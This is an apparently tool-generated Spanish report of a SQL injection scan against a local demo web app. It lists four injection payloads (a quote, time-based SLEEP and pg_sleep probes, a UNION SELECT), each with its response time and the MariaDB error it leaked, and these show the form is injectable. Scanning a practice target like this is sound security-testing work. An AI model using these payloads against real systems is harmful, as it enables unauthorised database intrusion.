# Informe de análisis SQLi


Objetivo: http://web.dev.local:8083
Fecha: 2026-04-13T08:52:10


Resumen:
- Vulnerabilidades potenciales encontradas: 4


Detalles:
### Target: http://web.dev.local:8083
- Tipo: FORM
- Método: GET
- Payload: `'`
- Código HTTP: 200
- Tiempo respuesta: 0.00s
- Error SQL detectado: True
```html
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 in /var/www/html/low.php:11
Stack trace:
#0 /var/www/html/low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
#1 /var/www/html/index.php(25): require_once('/var/www/html/l...')
#2 {main}
  thrown in <b>/var/www/html/low.php</b> on line <b>11</b><br />

```


### Target: http://web.dev.local:8083
- Tipo: FORM
- Método: GET
- Payload: `' OR SLEEP(5)-- `
- Código HTTP: None
- Tiempo respuesta: 15.02s
- Error SQL detectado: False
```html

```


### Target: http://web.dev.local:8083
- Tipo: FORM
- Método: GET
- Payload: `' OR pg_sleep(5)-- `
- Código HTTP: 200
- Tiempo respuesta: 0.01s
- Error SQL detectado: True
```html
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: FUNCTION sqli_demo.pg_sleep does not exist in /var/www/html/low.php:11
Stack trace:
#0 /var/www/html/low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
#1 /var/www/html/index.php(25): require_once('/var/www/html/l...')
#2 {main}
  thrown in <b>/var/www/html/low.php</b> on line <b>11</b><br />

```


### Target: http://web.dev.local:8083
- Tipo: FORM
- Método: GET
- Payload: `' UNION SELECT null-- `
- Código HTTP: 200
- Tiempo respuesta: 0.01s
- Error SQL detectado: True
```html
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: The used SELECT statements have a different number of columns in /var/www/html/low.php:11
Stack trace:
#0 /var/www/html/low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
#1 /var/www/html/index.php(25): require_once('/var/www/html/l...')
#2 {main}
  thrown in <b>/var/www/html/low.php</b> on line <b>11</b><br />

```

